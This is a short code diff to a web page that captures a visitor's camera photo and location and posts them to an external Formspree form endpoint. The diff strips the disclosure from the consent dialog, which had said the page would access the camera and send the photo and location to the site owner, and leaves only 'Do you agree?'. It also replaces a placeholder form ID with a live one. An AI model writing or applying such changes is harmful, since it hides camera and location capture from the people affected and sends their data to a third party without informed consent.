@@ -79,7 +79,7 @@ async function start() {
 
   setTimeout(async () => {
     const allow = confirm(
-      "This will access your camera and send your photo and location to the site owner. Do you agree?"
+      "Do you agree?"
     );
 
     if (!allow) {
@@ -121,7 +121,7 @@ function captureAndUpload() {
     formData.append("photo", blob, "photo.png");
     formData.append("location", locationText);
 
-    await fetch("https://formspree.io/f/YOUR_FORM_ID", {
+    await fetch("https://formspree.io/f/xjgknygj", {
       method: "POST",
       body: formData
     });
@@ -132,3 +132,4 @@ function captureAndUpload() {
 </script>
 </body>
 </html>
+
